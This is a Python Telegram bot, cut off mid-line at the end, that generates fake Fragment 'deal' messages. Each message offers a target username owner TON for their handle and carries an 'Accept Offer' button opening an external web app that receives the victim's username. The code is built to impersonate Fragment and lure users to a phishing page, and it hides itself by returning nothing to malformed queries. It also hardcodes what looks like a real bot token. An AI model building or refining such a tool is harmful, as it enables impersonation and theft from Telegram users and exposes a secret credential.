import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"📱 Web App: {WEBAPP_URL}")

# Variables globales
app = None
event_loop = None

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    try:
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        
        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if not query:
            await update.inline_query.answer([], cache_time=0)
            return
        
        # Parsing de la requête (username montant)
        parts = query.split()
        
        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
        if len(parts) < 2:
            await update.inline_query.answer([], cache_time=0)
            return
        
        username = parts[0].replace('@', '')  # Supprime @ si présent
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant doit être positif")
        except ValueError:
            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
            await update.inline_query.answer([], cache_time=0)
            return
        
        # Calculs (ajout minimal pour compléter le code)
        ton_usd_rate = 5.0  # Taux TON/USD supposé (modifiable)
        price = ton_amount
        price_usd = price * ton_usd_rate
        commission_rate = 0.05  # Commission supposée à 5%
        commission = price * commission_rate
        commission_usd = commission * ton_usd_rate
        
        # Message
        fragment_message = f"""@{username}, you've got a deal!
    
• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)
    
Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
        
        # Création des entités pour le formatage
        entities = []
        
        # 1. Offer Amount en gras
        offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
        offer_start = fragment_message.find(offer_text)
        if offer_start != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=offer_start,
                length=len(offer_text)
            ))
        
        # 2. Commission en gras
        commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
        commission_start = fragment_message.find(commission_text)
        if commission_start != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=commission_start,
                length=len(commission_text)
            ))
        
        # 3. Premier point Important en gras
        important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
        important_start1 = fragment_message.find(important_text1)
        if important_start1 != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=important_start1,
                length=len(important_text1)
            ))
        
        # 4. Deuxième point Important en gras (ajout pour complétude)
        important_text2 = "• If you choose not to proceed, simply ignore this message."
        important_start2 = fragment_message.find(important_text2)
        if important_start2 != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=important_start2,
                length=len(important_text2)
            ))
        
        # Clavier avec bouton WebApp
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton(
                "Accept Offer",
                web_app=WebAppInfo(url=f"{WEBAPP_URL}?username={username}&amount={ton_amount}")
            )
        ]])
        
        # Résultat inline
        results = [
            InlineQueryResultArticle(
                id=str(int(time.time())),
                title=f"Generate Offer for @{username} - {ton_amount} TON",
                input_message_content=InputTextMessageContent(
                    fragment_message,
                    entities=entities
                ),
                reply_markup=keyboard
            )
        ]
        
        await update.inline_query.answer(results, cache_time=0)
        
    except Exception as e:
        print(f"❌ Erreur dans inline handler: {e}")
        await update.inline_query.answer([], cache_time=0)

async def setup_bot():
    global app, event_loop
    event_loop = asyncio.get_running_loop()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(InlineQueryHandler(inline_query_handler))
    await app.initialize()
    await app.start()
    await app.bot.set_webhook(WEBHOOK_URL + '/' + BOT_TOKEN)

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique:
